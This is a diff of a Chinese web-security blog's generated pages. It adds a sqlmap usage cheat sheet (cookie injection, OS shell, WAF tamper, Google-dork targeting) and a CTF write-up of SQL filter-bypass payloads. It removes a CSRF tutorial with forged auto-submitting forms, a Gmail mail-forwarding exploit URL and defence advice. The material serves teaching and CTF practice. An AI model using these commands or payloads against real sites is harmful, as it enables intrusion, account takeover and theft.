+<h3 id="2-使用Cookie"><a href="#2-使用Cookie" class="headerlink" title="2. 使用Cookie"></a>2. 使用Cookie</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/member.php&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=123456&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-指定数据库类型"><a href="#3-指定数据库类型" class="headerlink" title="3. 指定数据库类型"></a>3. 指定数据库类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/page.php?id=1&quot;</span> --dbms=mysql</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-暴力破解表名"><a href="#4-暴力破解表名" class="headerlink" title="4. 暴力破解表名"></a>4. 暴力破解表名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/page.php?id=1&quot;</span> --common-tables</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-获取操作系统shell"><a href="#5-获取操作系统shell" class="headerlink" title="5. 获取操作系统shell"></a>5. 获取操作系统shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/page.php?id=1&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-绕过WAF"><a href="#6-绕过WAF" class="headerlink" title="6. 绕过WAF"></a>6. 绕过WAF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --tamper=space2comment</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h2><ol>
+<li><strong>使用代理观察请求</strong>：</li>
+</ol>
+<ul>
+<li><pre><code class="language-bash">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --proxy=&quot;http://127.0.0.1:8080&quot;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- **只检测不利用**：</span><br><span class="line">- ```bash</span><br><span class="line">  sqlmap -u &quot;http://example.com/page.php?id=1&quot; --batch --smart</span><br></pre></td></tr></table></figure>
 </code></pre>
-</blockquote>
-<p><img src="/.com//image-20250520024642-rrrnihd.png" alt="image"></p>
-<blockquote>
-<p>1、客户端通过账户密码登录访问网站A。<br>2、网站A验证客户端的账号密码，成功则生成一个sessionlD，并返回给客户端存储在浏览器中。<br>3、该客户端Tab—个新页面访问了网站B。<br>4、网站B自动触发要求该客户端访问网站A。(即在网站B中有链接指向网站A)<br>5、客户端通过网站B中的链接访问网站A。(此时携带有合法的SessionID进行访问站A的)<br>6、此时网站A只需检验sessionIlD是否合法，合法则执行相应的操作。(因此具体啥工具就得看链接，以及网站B要求访问时携带的数据)</p>
-</blockquote>
-<p>所以要被CSRF攻击，必须同时满足两个条件：</p>
-<p>登录受信任网站A，并在本地生成Cookie。 在不登出A的情况下，访问危险网站B。</p>
-<hr>
-<h2 id="三、CSRF分类"><a href="#三、CSRF分类" class="headerlink" title="三、CSRF分类"></a>三、CSRF分类</h2><p>CSRF(Cross-Site Request Forgery)，跟XSS漏洞攻击一样，存在巨大的危害性。</p>
-<p>你可以这么来理解:攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等</p>
-<h3 id="1-GET类型的CSRF"><a href="#1-GET类型的CSRF" class="headerlink" title="1. GET类型的CSRF"></a>1. GET类型的CSRF</h3><p>1.GET类型的CSRF</p>
-<p>仅仅须要一个HTTP请求。就能够构造一次简单的CSRF。</p>
-<p>样例：</p>
-<p>银行站点A：它以GET请求来完毕银行转账的操作，如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 </span><br></pre></td></tr></table></figure>
+</li>
+<li><strong>从Burp Suite日志导入</strong>：</li>
+<li><pre><code class="language-bash">sqlmap -l burp.log
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- **使用Google搜索结果测试**：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+sqlmap -g &quot;inurl:.php?id=&quot;
+</code></pre>
+</li>
+</ul>
+<pre><code>
+</code></pre>
 
-<p>危险站点B：它里面有一段HTML的代码例如以下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="attr">http</span>:<span class="comment">//www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>首先。你登录了银行站点A，然后访问危险站点B，噢，这时你会发现你的银行账户少了1000块。</p>
-<p>为什么会这样呢？原因是银行站点A违反了HTTP规范，使用GET请求更新资源。</p>
-<p>在访问危险站点B的之前。你已经登录了银行站点A，而B中的 一个合法的请求，但这里被不法分子利用了）。</p>
-<p>所以你的浏览器会带上你的银行站点A的Cookie发出Get请求，去获取资源以GET的方式请求第三方资源（这里的第三方就是指银行站点了），</p>
-<p>原本这是：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span></span><br></pre></td></tr></table></figure>
-
-<p>结果银行站点服务器收到请求后，觉得这是一个更新资源操作（转账操作），所以就立马进行转账操作。</p>
-<h3 id="2-POST类型的CSRF"><a href="#2-POST类型的CSRF" class="headerlink" title="2. POST类型的CSRF"></a>2. POST类型的CSRF</h3><p>在CSRF攻击流行之初，曾经有一种错误的观点，认为CSRF攻击只能由GET请求发起。因此很多开发者都认为只要把重要的操作改成只允许POST请求，就能防止CSRF攻击。</p>
-<p>这样的错误观点形成的原因主要在于，大多数CSRF攻击发起时，使用的HTML标签都是<image>、<iframe>、<script>等带“src&quot;属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求。</p>
-<p>而对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是$_REQUEST，而非$_POST获取变量，则会存在这个问题。</p>
-<p>对于一个表单来说，用户往往也就可以使用GET方式提交参数。比如以下表单:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot; / register&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;register&quot;</span> method=<span class="string">&quot;post&quot;</span> &gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=text name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=password name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=submit name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-
-<p>用户可尝试构造一个GET请求</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http: //host/register?username=<span class="built_in">test</span>&amp;password=passwd</span><br></pre></td></tr></table></figure>
-
-<p>来提交，若服务器端未对请求方法进行限制，则这个请求会通过。</p>
-<p>如果服务器端已经区分了GET与POST，那么攻击者有什么方法呢?对于攻击者来说，若干种方法可以构造出一个POST请求。</p>
-<p>最简单的方法，就是在一个页面中构造好一个表单表单，然后使用JavaScript自动提交这个表单。比如，攻击者在<a target="_blank" rel="noopener" href="http://www.b.com/test.html%E4%B8%AD%E7%BC%96%E5%86%99%E5%A6%82%E4%B8%8B%E4%BB%A3%E7%A0%81%EF%BC%9A">www.b.com/test.html中编写如下代码：</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http: / / www . a.com/register&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;register&quot;</span> method=<span class="string">&quot;post&quot;</span> &gt;&lt;input <span class="built_in">type</span>=text name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;&quot;</span>/&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=password name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;&quot;</span>/&gt;&lt;input <span class="built_in">type</span>=submit name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>/&gt;&lt;/ form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var f = document.getElementById ( <span class="string">&quot;register&quot;</span>);</span><br><span class="line">f.inputs [0].value = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">f.inputs [1].value = <span class="string">&quot;passwd&quot;</span> ;</span><br><span class="line">f.submit ();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>攻击者甚至可以将这个页面隐藏在一个不可见的iframe窗口中，那么整个自动提交表单的过程，对于用户来说也是不可见的。</p>
-<p>在2007年的Gmail CSRF漏洞攻击过程中，安全研究者pdp展示了这一技巧。首先，用户需要登录Gmail账户，以便让浏览器获得Gmail的临时Cookie。</p>
-<p><img src="/assets/image-20250520025130-b7gdarh.png" alt="image"></p>
-<p>用户登录Gmail</p>
-<p>然后，攻击者诱使用户访问一个恶意页面。</p>
-<p><img src="/assets/image-20250520025142-8swgbme.png" alt="image"></p>
-<p>攻击者诱使用户访问恶意页面</p>
-<p>在这个恶意页面中，隐藏了一个iframe，iframe的地址指向pdp写的CSRF构造页面。</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http: //www.gnucitizen.org/util/csrf?_method=POST&amp;_enctype=multipart/form-data&amp;_action=https%3A//mail.google.com/mail/h/ewtljmuj4ddv/%3Fv%3Dprf&amp;cf2_emc=<span class="literal">true</span>&amp;cf2_email=evilinboxmailinator.com&amp;cfl_from&amp;cfl_toucf1_subjicf1_has&amp;cfl_hasnotscf1_attach=truestfi&amp;S=z&amp;irf=on&amp;nvp bu_cftb=Create%20Filter</span><br></pre></td></tr></table></figure></blockquote>
-<p>这个链接的实际作用就是把参数生成一个POST的表单，并自动提交。<br>由于浏览器中已经存在Gmail的临时Cookie，所以用户在iframe中对Gmail发起的这次请求会成功―—邮箱的Filter中会新创建一条规则，将所有带附件的邮件都转发到攻击者的邮箱中。</p>
-<p><img src="/assets/image-20250520025208-tr38ddf.png" alt="image"></p>
-<p>恶意站点通过CSRF在用户的Gmail中建立一条规则。</p>
-<p>如果上述例子看得还是有点懵逼，那再举一个例子：</p>
-<p>在普通用户的眼中，点击网页-&gt;打开试看视频-&gt;购买视频是一个很正常的一个流程。可是在攻击者的眼中可以算正常但又不正常的，当然不正常的情况下，是在开发者安全意识不足所造成的。攻击者在购买处抓到购买时候网站处理购买(扣除)用户余额的地址。</p>
-<p>比如:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/coures/user/handler666buy.php&lt;/font&gt;</span><br></pre></td></tr></table></figure>
-
-<p>通过提交表单，buy.php处理购买的信息，这里的666为视频ID。那么攻击者现在构造一个链接，链接中包含以下内容。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=/coures/user/handler/666/buy method=POST&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;xx&quot;</span> value=<span class="string">&quot;xx&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>当用户访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作，自动购买了id为666的视频，从而导致受害者余额扣除。</p>
-<hr>
-<h2 id="四、CSRF漏洞的挖掘"><a href="#四、CSRF漏洞的挖掘" class="headerlink" title="四、CSRF漏洞的挖掘"></a>四、CSRF漏洞的挖掘</h2><p>1、最简单的方法就是抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞。</p>
-<p>2、如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
-<p>3、随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下:</p>
-<p>使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。</p>
-<p>如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
-<hr>
-<h2 id="五、CSRF漏洞的防御"><a href="#五、CSRF漏洞的防御" class="headerlink" title="五、CSRF漏洞的防御"></a>五、CSRF漏洞的防御</h2><h3 id="1、验证码"><a href="#1、验证码" class="headerlink" title="1、验证码"></a>1、验证码</h3><p>==验证码被认为是对抗CSRF攻击最简洁而有效的防御方法。==</p>
-<p>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击。</p>
-<p>但是验证码并非万能。很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。</p>
-<h3 id="2、在请求地址中添加-token-并验证"><a href="#2、在请求地址中添加-token-并验证" class="headerlink" title="2、在请求地址中添加 token 并验证"></a>2、在请求地址中添加 token 并验证</h3><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。</p>
-<p>要抵御 CSRF关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。</p>
-<p><span data-type="text" style="color: var(--b3-font-color8);">可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</span></p>
-<p><img src="/assets/image-20250520025334-kgrwlzn.png" alt="image"></p>
-<p>这种方法要比检查 Referer要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。</p>
-<p>对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a target="_blank" rel="noopener" href="http://url/?csrftoken=tokenvalue%E3%80%82">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上 ，这样就把 token 以参数的形式加入请求了。</p>
-<p><span data-type="text" style="color: var(--b3-font-color9);">但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。</span></p>
-<p>这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p>
-<p>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。</p>
-<p><span data-type="text" style="color: var(--b3-font-color6);">为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加</span></p>
-<p>不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p>
-<h3 id="3、在-HTTP-头中自定义属性并验证"><a href="#3、在-HTTP-头中自定义属性并验证" class="headerlink" title="3、在 HTTP 头中自定义属性并验证"></a>3、在 HTTP 头中自定义属性并验证</h3><p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。</p>
-<p>这样解决了上种方法在请求中加入 token 的不便，同时，通过XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p>
-<blockquote>
-<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">然而这种方法的局限性非常大，XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。</span></p>
-</blockquote>
-<p>另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
-<h3 id="4、验证-HTTP-Referer-字段"><a href="#4、验证-HTTP-Referer-字段" class="headerlink" title="4、验证 HTTP Referer 字段"></a>4、验证 HTTP Referer 字段</h3><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 ：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;<span class="keyword">for</span>=Mallory</span><br></pre></td></tr></table></figure>
-
-<p>用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。</p>
-<p>这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。</p>
-<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</span></p>
-<p>‍</p>
-<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
-<p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。</span></p>
-<p>使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。</p>
-<p>事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p>
-<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。</span></p>
-<p>因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
-<p>总结<br>CSRF攻击是攻击者利用用户的身份操作用户账户的一种攻击方式。设计CSRF的防御方案必须先理解CSRF攻击的原理和本质。我们通常使用Anti CSRF Token来防御CSRF攻击，在使用Token时，要注意Token的保密性和随机性。</p>
-</script></iframe></image></p>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/CSRF/" data-id="cmawa28n30000847k4dkx1qz9" data-title="CSRF攻击详解" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/" data-id="cmawal1j7001rbo7k3u3gc9mv" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" rel="tag">跨站请求伪造</a></li></ul>
+    </footer>
+  </div>
+  
+</article>
 
+
+
+  
+    <article id="post-Web/绕过/绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span><span class="comment"># 包含数据库连接文件</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);<span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125;<span class="comment"># 判断id的值是否大于999</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;<span class="comment"># id 大于 999 直接退出并返回错误</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;执行的sql为：<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;<span class="comment"># 执行sql 语句</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);<span class="comment"># 判断有没有查询结果</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - title: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;title&quot;</span>]. <span class="string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment"># 关闭数据库连接</span></span><br><span class="line">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = <span class="number">1000</span> --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>查看题目给我们的源码，发现这是用的intval函数，我们看这个禁用的名单，发现还是有很多没有禁用的</p>
+</blockquote>
+<blockquote>
+<p>方法一：?id&#x3D;1 || id&#x3D;1000 那这样sql语句就会变成select * from article where id &#x3D; 1 || id&#x3D;1000 order by id limit 1，以至于满足查询条件，而且查询到1000的信息</p>
+</blockquote>
+<blockquote>
+<p>方法二：~取反符号，双重取反~~1000</p>
+</blockquote>
+<blockquote>
+<p>方法三：二进制转换，<code>id=0b1111101000</code>​</p>
+</blockquote>
+<blockquote>
+<p>方法四：采用单引号，让判断为字符id&#x3D;’1000’</p>
+</blockquote>
+<blockquote>
+<p>方法五：采用异或，0000%5E1000</p>
+</blockquote>
+<blockquote>
+<p>方法六：采用恒定真值，id %23</p>
+</blockquote>
+<blockquote>
+<p>方法七：采用sql中除号的另外一种写法绕过（div）?id&#x3D;500 div 0.5</p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/" data-id="cmawal1j9001zbo7k9acyb633" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/基础注入流程" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
